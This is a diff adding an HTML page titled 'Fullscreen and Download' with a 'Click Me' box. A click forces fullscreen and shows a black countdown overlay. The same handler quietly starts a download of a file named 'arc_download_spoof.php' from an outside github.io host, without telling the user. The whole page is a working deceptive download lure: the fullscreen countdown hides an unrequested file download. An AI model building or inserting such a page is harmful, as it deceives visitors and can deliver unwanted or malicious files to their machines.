@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Fullscreen and Download</title>
+  <style>
+    body, html {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+    }
+    .square {
+      width: 200px;
+      height: 200px;
+      background-color: lightblue;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      margin: 100px auto;
+      text-align: center;
+      font-family: Arial, sans-serif;
+      font-size: 16px;
+      border: 2px solid black;
+    }
+
+    .fullscreen-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      background-color: black;
+      color: white;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 60px;
+      font-family: Arial, sans-serif;
+      z-index: 1000;
+      flex-direction: column;
+    }
+  </style>
+</head>
+<body>
+  <div class="square" id="clickableSquare">
+    Click Me
+  </div>
+
+  <div id="fullscreenOverlay" class="fullscreen-overlay" style="display: none;">
+    <div id="countdown">10</div>
+  </div>
+
+  <script>
+    function startCountdown() {
+      const overlay = document.getElementById("fullscreenOverlay");
+      const countdownText = document.getElementById("countdown");
+      overlay.style.display = "flex";
+      let count = 10;
+
+      const countdownInterval = setInterval(() => {
+        countdownText.textContent = count;
+        if (count > 0) {
+          count--;
+        } else {
+          clearInterval(countdownInterval);
+          countdownText.textContent = "Thank you!";
+        }
+      }, 1000);
+    }
+
+    document.getElementById("clickableSquare").addEventListener("click", function () {
+      const element = document.documentElement;
+      if (element.requestFullscreen) {
+        element.requestFullscreen().then(() => {
+          startCountdown();
+        });
+      } else if (element.mozRequestFullScreen) {
+        element.mozRequestFullScreen();
+        startCountdown();
+      } else if (element.webkitRequestFullscreen) {
+        element.webkitRequestFullscreen();
+        startCountdown();
+      } else if (element.msRequestFullscreen) {
+        element.msRequestFullscreen();
+        startCountdown();
+      }
+
+      // Trigger file download
+      const fileUrl = "https://frozzipies.github.io/arc_download_spoof.php";
+      const link = document.createElement("a");
+      link.href = fileUrl;
+      link.download = fileUrl.split("/").pop();
+      document.body.appendChild(link);
+      link.click();
+      document.body.removeChild(link);
+    });
+  </script>
+</body>
+</html>
